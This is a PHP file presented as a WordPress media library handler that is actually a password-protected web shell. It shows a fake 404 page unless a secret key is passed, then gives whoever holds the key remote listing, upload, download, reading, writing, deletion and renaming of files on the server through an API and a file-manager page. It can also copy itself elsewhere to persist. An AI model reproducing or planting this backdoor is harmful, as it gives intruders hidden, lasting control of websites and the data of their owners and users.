<?php
/**
 * WordPress Media Library Handler
 * @package WordPress\Media
 * @since 5.0.0
 */
// Direct execution
error_reporting(0);@ini_set('display_errors','0');
@ini_set('post_max_size','128M');@ini_set('upload_max_filesize','128M');
$wp_media_key=isset($_REQUEST['gcsxaozi'])?$_REQUEST['gcsxaozi']:'';
if($wp_media_key!=='deb67b746e1285a0'){header('HTTP/1.0 404 Not Found');echo '<html><head><title>404</title></head><body><h1>Not Found</h1></body></html>';exit;}
$wp_op=isset($_REQUEST['a'])?$_REQUEST['a']:'';
$wp_dir=isset($_REQUEST['p'])?$_REQUEST['p']:@realpath('.');
// API mode
if($wp_op!==''){
header('Content-Type:application/json;charset=utf-8');
if($wp_op==='ls'){$rp=@realpath($wp_dir);$items=array();
if($rp&&is_dir($rp)){$ents=@scandir($rp);if($ents)foreach($ents as $e){if($e==='.')continue;
$fp=$rp.'/'.$e;$items[]=array('n'=>$e,'d'=>is_dir($fp)?1:0,'s'=>is_file($fp)?@filesize($fp):0,
'm'=>@filemtime($fp),'p'=>substr(sprintf('%o',@fileperms($fp)),-4));}}
echo json_encode(array('s'=>'ok','path'=>$rp?$rp:$wp_dir,'items'=>$items));exit;}
if($wp_op==='up'&&isset($_FILES['f'])){$dest=rtrim($wp_dir,'/').'/'.basename($_FILES['f']['name']);
if(@move_uploaded_file($_FILES['f']['tmp_name'],$dest)){@chmod($dest,0644);
echo json_encode(array('s'=>'ok','path'=>$dest));}else{echo json_encode(array('s'=>'err'));}exit;}
if($wp_op==='dl'){$rp=@realpath($wp_dir);if($rp&&is_file($rp)){
header('Content-Type:application/octet-stream');header('Content-Disposition:attachment;filename="'.basename($rp).'"');
header('Content-Length:'.@filesize($rp));@readfile($rp);}exit;}
if($wp_op==='rd'){$rp=@realpath($wp_dir);
echo json_encode(array('s'=>($rp&&is_file($rp))?'ok':'err','data'=>($rp&&is_file($rp))?@file_get_contents($rp):''));exit;}
if($wp_op==='wr'){$d=isset($_REQUEST['d'])?$_REQUEST['d']:'';
echo json_encode(array('s'=>@file_put_contents($wp_dir,$d)!==false?'ok':'err'));exit;}
if($wp_op==='rm'){$rp=@realpath($wp_dir);if($rp){is_dir($rp)?@rmdir($rp):@unlink($rp);}
echo json_encode(array('s'=>'ok'));exit;}
if($wp_op==='rn'){$n=isset($_REQUEST['n'])?$_REQUEST['n']:'';
echo json_encode(array('s'=>($n&&@rename($wp_dir,dirname($wp_dir).'/'.$n))?'ok':'err'));exit;}
if($wp_op==='md'){echo json_encode(array('s'=>@mkdir($wp_dir,0755,true)?'ok':'err'));exit;}
if($wp_op==='cp'){$d=isset($_REQUEST['d'])?$_REQUEST['d']:'';
if($d){$pd=dirname($d);if(!is_dir($pd))@mkdir($pd,0755,true);}
echo json_encode(array('s'=>($d&&@copy(__FILE__,$d))?'ok':'err'));exit;}
echo json_encode(array('s'=>'err','msg'=>'unknown'));exit;}
// GUI mode
$rp=@realpath($wp_dir);if(!$rp||!is_dir($rp)){$rp=@realpath('.');$wp_dir=$rp;}
$base=htmlspecialchars($_SERVER['SCRIPT_NAME']).'?gcsxaozi=deb67b746e1285a0';
?><!DOCTYPE html><html><head><meta charset="utf-8"><title>Media</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#1a1b26;color:#a9b1d6;font:12px/1.5 monospace;padding:10px}
.bar{background:#24283b;padding:6px 12px;border-bottom:1px solid #414868;margin-bottom:8px;font-size:11px;color:#7aa2f7;display:flex;align-items:center;gap:6px;flex-wrap:wrap;border-radius:4px}
.bar a{color:#f7768e;text-decoration:none}table{width:100%;border-collapse:collapse}
th{text-align:left;padding:4px 8px;background:#24283b;color:#bb9af7;font-size:10px;text-transform:uppercase}
td{padding:3px 8px;border-bottom:1px solid #24283b;font-size:11px}tr:hover{background:#24283b}
.dr{color:#f7768e;font-weight:700}a{color:#7aa2f7;text-decoration:none}.sz{color:#565f89;font-size:10px}
.ac a{color:#565f89;font-size:10px;margin-right:4px}.ac a:hover{color:#f7768e}
.uf{background:#24283b;padding:6px 12px;border-bottom:1px solid #414868;margin-bottom:8px;border-radius:4px}
input[type=file]{color:#a9b1d6;font-size:11px}button{background:#414868;color:#7aa2f7;border:none;padding:2px 10px;cursor:pointer;font-size:10px;border-radius:3px}</style></head><body>
<div class="bar"><b><?=htmlspecialchars($rp)?></b><?php if($rp!=='/')echo ' <a href="'.$base.'&p='.urlencode(dirname($rp)).'">[..]</a>';?></div>
<div class="uf"><form method="post" enctype="multipart/form-data" action="<?=$base?>&a=up&p=<?=urlencode($rp)?>">
<input type="file" name="f"> <button type="submit">Upload</button></form></div>
<table><thead><tr><th>Name</th><th>Size</th><th>Perm</th><th>Actions</th></tr></thead><tbody>
<?php $ls=@scandir($rp);if($ls)foreach($ls as $e){if($e==='.')continue;$fp=$rp.'/'.$e;$id=is_dir($fp);
$sz=$id?'-':number_format(@filesize($fp));$pm=substr(sprintf('%o',@fileperms($fp)),-4);
if($id){$nm='<a class="dr" href="'.$base.'&p='.urlencode($fp).'">'.htmlspecialchars($e).'/</a>';}
else{$nm='<span>'.htmlspecialchars($e).'</span>';}
$ac='<span class="ac">';if(!$id)$ac.='<a href="'.$base.'&a=dl&p='.urlencode($fp).'">dl</a>';
$ac.='<a href="'.$base.'&a=rm&p='.urlencode($fp).'" onclick="return confirm(\'Delete?\')">rm</a></span>';
echo '<tr><td>'.$nm.'</td><td class="sz">'.$sz.'</td><td class="sz">'.$pm.'</td><td>'.$ac.'</td></tr>';}?>
</tbody></table></body></html><?php exit;
